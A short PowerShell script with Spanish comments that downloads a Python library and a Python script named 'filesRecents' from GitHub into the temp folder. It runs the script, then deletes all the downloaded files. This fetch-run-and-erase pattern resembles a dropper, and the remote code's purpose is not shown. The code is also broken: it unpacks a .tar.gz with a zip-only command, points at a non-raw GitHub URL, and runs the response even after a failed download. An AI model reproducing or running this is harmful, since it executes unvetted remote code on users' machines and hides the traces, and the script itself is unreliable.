# Descargar openpyxl manualmente
$openpyxlURL = 'https://files.pythonhosted.org/packages/42/e8/af028681d493814ca9c2ff8106fc62a4a32e4e0ae14602c2a98fc7b741c8/openpyxl-3.1.2.tar.gz'
$openpyxlPath = "$env:TEMP\openpyxl.tar.gz"
Invoke-WebRequest -Uri $openpyxlURL -OutFile $openpyxlPath

# Descomprimir openpyxl
Expand-Archive -Path $openpyxlPath -DestinationPath "$env:TEMP\openpyxl"

# Ruta donde se guardará el script de Python
$pythonScriptPath = "$env:TEMP\script.py"

# URL de tu script de Python
$pythonScriptURL = 'https://github.com/astronomyc/filesRecents/main.py'

try {
    $response = Invoke-WebRequest -Uri $pythonScriptURL -UseBasicParsing
}
catch {
    # Manejar cualquier error que ocurra durante la descarga
    Write-Host "Ocurrió un error durante la ejecución del script."
}

# Guardar el contenido descargado en un archivo
Set-Content -Path $pythonScriptPath -Value $response.Content

# Añadir la ruta de openpyxl al PYTHONPATH
$env:PYTHONPATH = "$env:TEMP\openpyxl"

# Ejecutar el script de Python utilizando el intérprete de Python
python.exe $pythonScriptPath

# Limpiar los archivos descargados después de ejecutar el script
Remove-Item -Path $pythonScriptPath
Remove-Item -Path $openpyxlPath
Remove-Item -Path "$env:TEMP\openpyxl" -Recurse -Force
